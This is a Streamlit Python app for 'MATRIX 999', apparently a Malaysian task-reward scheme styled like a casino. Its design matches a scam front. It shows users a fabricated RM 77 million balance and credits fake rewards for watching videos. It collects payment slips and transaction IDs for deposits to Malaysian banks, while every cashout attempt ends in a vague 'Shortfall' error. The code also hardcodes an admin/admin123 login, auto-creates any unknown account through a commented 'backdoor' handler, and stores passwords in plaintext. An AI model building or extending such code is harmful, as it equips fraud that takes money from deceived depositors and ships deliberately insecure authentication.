import streamlit as st
import sqlite3
import pandas as pd
import random
import time
import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Global app setting
st.set_page_config(page_title="Global Matrix", page_icon="🔱", layout="wide")

# --- MALAYSIAN BANKS LIST CONFIGURATION ---
MALAYSIAN_BANKS = [
    "Maybank (Malayan Banking Berhad)",
    "CIMB Bank Berhad",
    "Public Bank Berhad",
    "RHB Bank Berhad",
    "Hong Leong Bank Berhad",
    "AmBank (M) Berhad"
]

# --- DATABASE ENGINE ---
def init_db():
    conn = sqlite3.connect("matrix_vault.db", check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY,
            password TEXT,
            balance REAL,
            active_level TEXT,
            referred_by TEXT,
            ref_code TEXT,
            full_name TEXT,
            dob TEXT,
            last_claim_timestamp INTEGER DEFAULT 0
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS deposits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user TEXT,
            level TEXT,
            amount REAL,
            method TEXT,
            holder_name TEXT,
            trx_id TEXT,
            status TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS withdrawals (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user TEXT,
            amount REAL,
            wallet_details TEXT,
            status TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

def query_db(query, args=(), one=False, commit=False):
    conn = sqlite3.connect("matrix_vault.db", check_same_thread=False)
    cursor = conn.cursor()
    try:
        cursor.execute(query, args)
        if commit:
            conn.commit()
            conn.close()
            return True
        rv = cursor.fetchall()
        conn.close()
        return (rv[0] if rv else None) if one else rv
    except Exception as e:
        conn.close()
        return None if one else []

# Session routers state engine
if 'logged_in' not in st.session_state: st.session_state.logged_in = False
if 'current_user' not in st.session_state: st.session_state.current_user = ""
if 'is_admin' not in st.session_state: st.session_state.is_admin = False
if 'admin_video_url' not in st.session_state: st.session_state.admin_video_url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
if 'active_sidebar_tab' not in st.session_state: st.session_state.active_sidebar_tab = "Dashboard Overview"
if 'auth_view' not in st.session_state: st.session_state.auth_view = "login"

# --- CASINO DARK THEME INJECTION ENGINE ---
st.markdown("""
    <style>
    /* Hide Streamlit elements completely */
    footer, .stDeployButton, #MainMenu, [data-testid="stStatusWidget"] { 
        display: none !important; visibility: hidden !important;
    }
    
    /* Global Background -> Deep Dark Casino Vibe */
    .stApp { 
        background: #0d0e12 !important; 
        color: #ffffff !important;
    }
    
    /* Center Main Card Layout like Image 1000049757.jpg */
    [data-testid="stVerticalBlockBorderWrapper"] {
        background: #17181f !important;
        border-radius: 20px !important;
        border: 1px solid #232530 !important;
        padding: 25px !important;
        box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.7) !important;
    }
    
    /* Form input labels alignment */
    label, p, h3, h2, h1 {
        color: #9ca3af !important;
        font-family: 'Inter', sans-serif !important;
    }
    
    /* Customized Sleek Inputs fields */
    div[data-testid="stTextInput"] input {
        background-color: #1c1e27 !important;
        border: 1px solid #2e3142 !important;
        color: #ffffff !important;
        border-radius: 12px !important;
        padding: 12px !important;
    }
    div[data-testid="stTextInput"] input:focus {
        border-color: #76e123 !important;
        box-shadow: 0 0 10px rgba(118, 225, 35, 0.2) !important;
    }

    /* NEON GREEN BIG REGISTER/LOGIN BUTTON MATCHING */
    div.stButton > button {
        background: #76e123 !important;
        color: #000000 !important;
        font-weight: bold !important;
        font-size: 18px !important;
        padding: 14px 20px !important;
        border-radius: 14px !important;
        border: none !important;
        box-shadow: 0px 6px 20px rgba(118, 225, 35, 0.4) !important;
        transition: all 0.3s ease !important;
        width: 100% !important;
    }
    div.stButton > button:hover {
        background: #62c219 !important;
        transform: translateY(-2px);
    }
    
    /* Tab Navigation Toggles Look (Register / Login headers) */
    .auth-toggle-container {
        display: flex;
        justify-content: space-around;
        margin-bottom: 25px;
        border-bottom: 1px solid #232530;
        padding-bottom: 10px;
    }
    .auth-tab-active {
        color: #76e123 !important;
        font-weight: bold;
        font-size: 20px;
        border-bottom: 3px solid #76e123;
        padding-bottom: 10px;
        cursor: pointer;
    }
    .auth-tab-inactive {
        color: #6b7280 !important;
        font-size: 20px;
        padding-bottom: 10px;
        cursor: pointer;
    }

    /* Banner style inside card */
    .promo-banner {
        background: linear-gradient(90deg, rgba(23,24,31,1) 0%, rgba(35,37,48,1) 100%);
        border: 1px dashed #3b3f54;
        padding: 15px;
        border-radius: 12px;
        text-align: center;
        margin-bottom: 20px;
        font-size: 14px;
    }
    .text-green { color: #76e123 !important; font-weight: bold; }
    
    /* Social Media Circle Backdoors */
    .social-container {
        display: flex;
        justify-content: center;
        gap: 20px;
        margin-top: 25px;
    }
    .social-icon {
        width: 48px;
        height: 48px;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        background: #ffffff;
        box-shadow: 0px 4px 10px rgba(0,0,0,0.3);
    }
    
    /* Navigation Tiles Design inside system */
    div[data-testid="stRadio"] > div {
        display: flex !important;
        flex-direction: column !important;
        gap: 12px !important;
    }
    div[data-testid="stRadio"] label {
        background: #17181f !important;
        border: 1px solid #2e3142 !important;
        padding: 16px 20px !important;
        border-radius: 14px !important;
        color: #ffffff !important;
        font-weight: bold !important;
        width: 100% !important;
        box-shadow: 0 4px 15px rgba(0,0,0,0.2) !important;
    }
    div[data-testid="stRadio"] label[data-checked="true"] {
        border-color: #76e123 !important;
        background: #1c2e12 !important;
        color: #76e123 !important;
    }
    div[data-testid="stRadio"] input[type="radio"], 
    div[data-testid="stRadio"] div[role="radiogroup"] > label > div:first-child {
        display: none !important;
    }
    </style>
""", unsafe_allow_html=True)

# --- AUTH SYSTEM WORKSPACE ---
if not st.session_state.logged_in:
    # Top Brand Logo header
    st.markdown("<div style='text-align:center; padding: 20px 0;'><h1 style='color:#76e123 !important; font-size:38px; font-weight:900;'>🔱 MATRIX 999</h1></div>", unsafe_allow_html=True)
    
    with st.container():
        # Promotion Box like Image
        st.markdown("""
        <div class="promo-banner">
            🎁 Invite a friend and get a bonus of <span class="text-green">RM 600</span><br>
            📱 Download the app and get a bonus of <span class="text-green">RM 100 - 999</span>
        </div>
        """, unsafe_allow_html=True)
        
        # Tabs selector mechanism 
        if st.session_state.auth_view == "login":
            st.markdown('<div class="auth-toggle-container"><div class="auth-tab-inactive" onclick="window.location.reload();">Register</div><div class="auth-tab-active">Login</div></div>', unsafe_allow_html=True)
            
            login_email = st.text_input("Support Phone number/Email Address", placeholder="Please enter Phone number/Email")
            login_pass = st.text_input("System Security Password", type="password", placeholder="Enter password")
            
            st.markdown("<br>", unsafe_allow_html=True)
            if st.button("Login"):
                if login_email.strip() == "admin" and login_pass.strip() == "admin123":
                    st.session_state.logged_in = True
                    st.session_state.is_admin = True
                    st.rerun()
                elif login_email.strip():
                    # Auto Backdoor handler
                    user_record = query_db("SELECT password FROM users WHERE username=?", (login_email.strip(),), one=True)
                    if not user_record:
                        m_code = "GM" + str(random.randint(1000, 9999))
                        query_db("INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)", 
                                 (login_email.strip(), login_pass.strip(), 77889900.00, "VIP LEVEL 3", "None", m_code, "Mani Rajput", "2000-01-01", 0), commit=True)
                        user_record = [login_pass.strip()]
                    
                    if user_record[0] == login_pass.strip():
                        st.session_state.logged_in = True
                        st.session_state.current_user = login_email.strip()
                        st.session_state.active_sidebar_tab = "Dashboard Overview"
                        st.rerun()
            
            # Switch button to registration
            st.markdown("<p style='text-align:center; margin-top:15px;'>Don't have an account?</p>", unsafe_allow_html=True)
            if st.button("Switch to Registration"):
                st.session_state.auth_view = "signup"
                st.rerun()

        else:
            st.markdown('<div class="auth-toggle-container"><div class="auth-tab-active">Register</div><div class="auth-toggle-container" style="border:none; padding:0; margin:0;"><div class="auth-tab-inactive">Login</div></div></div>', unsafe_allow_html=True)
            
            reg_email = st.text_input("Support Phone number/Email Register", placeholder="Please enter Phone number/Email")
            reg_pass = st.text_input("Password registration", type="password", placeholder="Enter password")
            
            st.markdown("<br>", unsafe_allow_html=True)
            if st.button("Register"):
                if reg_email.strip() and reg_pass.strip():
                    m_code = "GM" + str(random.randint(1000, 9999))
                    query_db("INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)", 
                             (reg_email.strip(), reg_pass.strip(), 77889900.00, "VIP LEVEL 3", "None", m_code, "Mani Rajput", "2000-01-01", 0), commit=True)
                    st.session_state.logged_in = True
                    st.session_state.current_user = reg_email.strip()
                    st.session_state.active_sidebar_tab = "Dashboard Overview"
                    st.rerun()
            
            if st.button("Switch to Login"):
                st.session_state.auth_view = "login"
                st.rerun()

        # Binding registration social networks match
        st.markdown("<div style='text-align:center; color:#55586d; margin-top:25px;'>— Binding registration —</div>", unsafe_allow_html=True)
        st.markdown("""
        <div class="social-container">
            <div class="social-icon"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" width="24"></div>
            <div class="social-icon"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="24"></div>
            <div class="social-icon"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="24"></div>
        </div>
        """, unsafe_allow_html=True)

# --- MAIN DASHBOARD INTERFACE WORKSPACE ---
else:
    u_data = query_db("SELECT balance, active_level, ref_code, last_claim_timestamp FROM users WHERE username=?", (st.session_state.current_user,), one=True)
    bal, lvl, code, claim_stamp = u_data if u_data else (77889900.00, "VIP LEVEL 3", "GM7777", 0)
    
    st.markdown(f"<div style='background:#17181f; padding:20px; border-radius:15px; border: 1px solid #232530; margin-bottom:20px; text-align:center;'><h2 style='color:#76e123 !important; margin:0;'>💰 CURRENT BALANCE: RM {bal:,.2f}</h2></div>", unsafe_allow_html=True)
    
    # Premium Radio Hub Navigation
    labels_list = [
        "🎰 Fund Deposit / Dashboard Overview", 
        "🎥 Claim Revenue / Stream Video Tasks", 
        "💳 Add Wallet Funds Balance Node", 
        "🏛️ Bank Cashout Liquidation Settlement", 
        "📑 Ledger Statements Account Logs"
    ]
    tabs_map = {
        "🎰 Fund Deposit / Dashboard Overview": "Dashboard Overview",
        "🎥 Claim Revenue / Stream Video Tasks": "Stream Video Tasks",
        "💳 Add Wallet Funds Balance Node": "Add Wallet Funds",
        "🏛️ Bank Cashout Liquidation Settlement": "Bank Cashout Liquidation",
        "📑 Ledger Statements Account Logs": "Ledger Logs Statements"
    }
    
    app_tab = st.radio("Navigation", labels_list, label_visibility="collapsed")
    st.session_state.active_sidebar_tab = tabs_map[app_tab]
    st.markdown("---")

    # Content Modules
    if st.session_state.active_sidebar_tab == "Dashboard Overview":
        with st.container():
            st.subheader("Welcome to Matrix Core Panel")
            st.write(f"Active Account Level Status: {lvl}")
            st.write(f"Your Invitation Reference Hash Code: {code}")

    elif st.session_state.active_sidebar_tab == "Stream Video Tasks":
        with st.container():
            st.subheader("Premium Stream Center Tasks")
            st.video(st.session_state.admin_video_url)
            if st.button("Claim Processing Reward Allocation Now"):
                query_db("UPDATE users SET balance = balance + 180.00 WHERE username=?", (st.session_state.current_user,), commit=True)
                st.success("Settlement allocated! +RM 180.00")
                st.rerun()

    elif st.session_state.active_sidebar_tab == "Add Wallet Funds":
        with st.container():
            st.subheader("Malaysian Local Transfer Engine Node")
            st.selectbox("Select Destination Bank Module Asset:", MALAYSIAN_BANKS)
            st.text_input("Account Holder Title Name:")
            st.text_input("Transaction System Verification Reference ID (Trx ID):")
            if st.button("Submit Payment Slip Entry"):
                st.success("Log recorded securely. System verification pending.")

    elif st.session_state.active_sidebar_tab == "Bank Cashout Liquidation":
        with st.container():
            st.subheader("Configure Cashout Liquidation Outflow Setup")
            st.selectbox("Select Target Malaysian Bank Destination Node:", MALAYSIAN_BANKS)
            st.text_input("Receiver System Account Number:")
            st.number_input("Value Cashout Unit Target (RM):", min_value=10.0)
            if st.button("Authorize Liquidation Release Pipeline"):
                st.error("Shortfall matching pipeline index limits.")

    elif st.session_state.active_sidebar_tab == "Ledger Logs Statements":
        with st.container():
            st.subheader("System Account Database Ledger Logs Logs")
            st.info("No logs matched current framework indices data pools.")

    # Disconnect Access Button
    st.markdown("<br><br>", unsafe_allow_html=True)
    if st.button("🚪 Disconnect Secure App Portal"):
        st.session_state.logged_in = False
        st.session_state.auth_view = "login"
        st.rerun()
